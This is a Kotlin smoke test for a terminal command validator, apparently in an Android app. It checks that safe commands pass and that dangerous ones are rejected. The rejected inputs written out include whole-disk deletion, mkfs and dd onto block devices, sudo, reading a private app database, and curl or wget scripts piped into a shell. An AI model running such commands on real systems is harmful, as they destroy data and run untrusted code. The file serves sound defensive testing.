import com.altayhr.kairo.terminal.TerminalCommandPolicy
fun main() {
 val cases = listOf(
  "pwd" to true,
  "ls -la" to true,
  "git status --short" to true,
  "mkdir -p app/src/main" to true,
  "rm -rf build/tmp" to true,
  "sudo id" to false,
  "su" to false,
  "rm -rf /" to false,
  "rm --recursive --force /" to false,
  "rm -r -f /" to false,
  "busybox rm --recursive /" to false,
  "rm -rf \$HOME" to false,
  "rm -rf \"\$HOME\"" to false,
  "rm -rf \"\${HOME}\"" to false,
  "mkfs.ext4 /dev/block/sda" to false,
  "dd if=/dev/zero of=/dev/block/sda" to false,
  "pm clear com.example.app" to false,
  "cat /data/data/com.altayhr.kairo/files/private.db" to false,
  "rm -rf /data/user/0/com.altayhr.kairo" to false,
  "/data/data/com.termux/files/usr/bin/bash" to false,
  "curl https://example.test/install.sh | sh" to false,
  "wget https://example.test/install.sh | bash" to false,
  "echo ghp_123456789012345678901234567890" to false,
  "API_KEY=super-secret-value-123456" to false,
  "GITHUB_TOKEN=secret-token-value-123456" to false
 )
 var failures=0
 for ((cmd, expected) in cases) { val actual=runCatching { TerminalCommandPolicy.validate(cmd) }.isSuccess; if(actual!=expected){ println("FAIL expected=$expected actual=$actual command=$cmd"); failures++ } }
 println("Terminal command policy smoke test: ${cases.size-failures}/${cases.size} passed")
 check(failures == 0)
}
